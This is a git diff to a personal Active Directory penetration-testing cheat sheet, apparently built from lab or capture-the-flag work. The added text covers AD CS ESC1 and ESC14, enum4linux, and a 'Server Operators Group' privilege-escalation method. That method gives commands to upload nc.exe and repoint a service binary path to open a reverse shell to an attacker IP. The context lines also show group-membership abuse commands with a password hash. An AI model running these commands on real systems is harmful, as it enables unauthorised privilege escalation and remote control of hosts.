@@ -46,6 +46,7 @@
 
 - [BloodHound GUI](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
 - [TargetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast/tree/main)
+- [ESC14 GetWeakExplicitMappings.py](https://github.com/3C4D/GetWeakExplicitMappings/blob/main/GetWeakExplicitMappings.py)
 
 # Enumeration
 search for:
@@ -55,6 +56,7 @@ search for:
 - list Certificates
 - list ACL permissions
 - collect Bloodhound files
+- enum4linux
 
 
 try using default credentials like `guest` and no password\
@@ -157,6 +159,10 @@ WriteProperty 	|   Can edit all properties
 FullControl 	|   Full control of object, all properties can be edited
 ```
 
+### ESC1
+---
+ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.
+
 ### ESC4
 ---
 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
@@ -169,9 +175,12 @@ ESC4 is when a user has write privileges over a certificate template. This can f
 
 so you log in with evil-winrm using the second part of the HASH
 
-### ESC1
----
-ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.
+### ESC14
+This attack exploits configuration errors when explicit mapping is set up. [Learn more.](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-mapping)
+
+Detection of weak explicit mapping can be done like this:
+`python3 GetWeakExplicitMappings.py -dc-host $DC_HOST -u $USERNAME -p $PASSWORD -domain $DOMAIN`
+
 
 # Dangerous privilege
 
@@ -233,7 +242,22 @@ with Generic All permissions you can change your group membership.
 - `net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
 - `bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add groupMember 'Administrators' test`
 
-# 
+# Server Operators Group
+explotaible. [Learn more.](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators)
+
+Members of this group can start/stop system services. Let's
+modify a service binary path to obtain a reverse shell.
+```ps1
+upload nc.exe
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe {IP} {PORT}"
+```
+Stand up a listener issue the below commands to obtain the reverse shell.
+
+```ps1
+sc.exe stop vss
+sc.exe start vss
+```
+You can obtain a reverse shell with `NT Authority`
 
 # notes from adri TODO
 
